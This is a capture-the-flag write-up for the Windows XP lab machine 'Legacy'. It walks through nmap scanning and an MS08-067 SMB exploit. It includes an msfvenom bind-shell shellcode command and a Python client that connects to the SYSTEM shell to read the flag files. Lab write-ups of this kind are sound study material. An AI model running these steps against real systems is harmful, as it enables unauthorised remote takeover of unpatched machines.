## Overview

Legacy is an easy-difficulty Windows XP machine that demonstrates the danger of exposing SMB on an unpatched, end-of-life operating system. Recon shows ports 139 and 445 open on Windows XP SP3, and nmap's SMB vuln scripts confirm the host is exploitable via two infamous remote-code-execution bugs. The [MS08-067](https://nvd.nist.gov/vuln/detail/CVE-2008-4250) flaw runs our code directly as `NT AUTHORITY\SYSTEM`, so a single exploit is both foothold and full compromise.

## Recon

| Port | Service     | Version                       |
|------|-------------|-------------------------------|
| 135  | msrpc       | Microsoft Windows RPC         |
| 139  | netbios-ssn | Microsoft Windows netbios-ssn |
| 445  | microsoft-ds| Windows XP microsoft-ds       |

The OS fingerprint is Windows XP SP3 with SMB message signing disabled — a strong tell for the classic SMB RCE chains.

```bash
nmap -sC -sV 10.129.11.217
```

## Enumeration

nmap's SMB vulnerability scripts confirm the host is unpatched against both [MS08-067](https://nvd.nist.gov/vuln/detail/CVE-2008-4250) and [MS17-010](https://nvd.nist.gov/vuln/detail/CVE-2017-0143) (EternalBlue). Either is a clean path to code execution; MS08-067 is the most direct.

```bash
nmap -p139,445 --script smb-vuln-ms08-067,smb-vuln-ms17-010 10.129.11.217
```

## Foothold

MS08-067 is a [classic stack buffer overflow](https://cwe.mitre.org/data/definitions/120.html) in the SMB Server service's `NetPathCanonicalize` path-handling function. Because that service runs as `NT AUTHORITY\SYSTEM`, exploiting it yields the highest-privileged shell on the box outright.

The exploit is a standalone Python script built on **impacket** — no Metasploit. It speaks DCE/RPC over SMB to the vulnerable Server-service interface and sends an over-long, crafted path to `NetPathCanonicalize`, overflowing the stack buffer and redirecting execution into shellcode. A **bind** shellcode is used rather than a reverse shell — we connect *to* a port the payload opens on the target, which is the right choice when the attacker host can't receive an inbound connection. The script (jivoi / Debasis Mohanty, Python 3 port) takes a target index; `7` is Windows XP SP3 English (AlwaysOn NX).

First generate the bind-shell shellcode with msfvenom — this is the one and only Metasploit touchpoint (payload bytes, not exploitation), null-free to survive the SMB path encoding:

```bash
msfvenom -p windows/shell_bind_tcp RHOST=0.0.0.0 LPORT=4444 EXITFUNC=thread \
  -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

The exploit leaves a SYSTEM command shell listening on port 4444. A short client connects and reads both flags in a single connection:

Create `bindclient.py`:

```python
#!/usr/bin/env python3
import socket, time
ip, port = "10.129.11.217", 4444
cmds = [
    'type "C:\\Documents and Settings\\john\\Desktop\\user.txt"',
    'type "C:\\Documents and Settings\\Administrator\\Desktop\\root.txt"',
]
s = socket.socket(); s.settimeout(8); s.connect((ip, port)); time.sleep(1)
for c in cmds:
    s.sendall((c + "\r\n").encode()); time.sleep(1.5)
    out = b""
    while True:
        try: out += s.recv(65535)
        except socket.timeout: break
    print(out.decode(errors="replace"), end="")
s.close()
```

```bash
python3 bindclient.py
```

## User flag

```cmd
type "C:\Documents and Settings\john\Desktop\user.txt"   # HTB{...}
```

The shell already runs as `NT AUTHORITY\SYSTEM`, so user-level access is more than satisfied.

## Privilege Escalation

There is none — and that is the lesson. MS08-067 executes inside the SMB Server service, which runs as SYSTEM, so the foothold *is* the privilege escalation. No sudo rule, SUID binary, or kernel exploit is involved; the root flag is read from the very same shell that captured the user flag.

## Root flag

```cmd
type "C:\Documents and Settings\Administrator\Desktop\root.txt"   # HTB{...}
```

Full compromise from a single unauthenticated SMB packet — a reminder to patch [MS08-067](https://nvd.nist.gov/vuln/detail/CVE-2008-4250), disable SMBv1, and retire end-of-life Windows entirely.
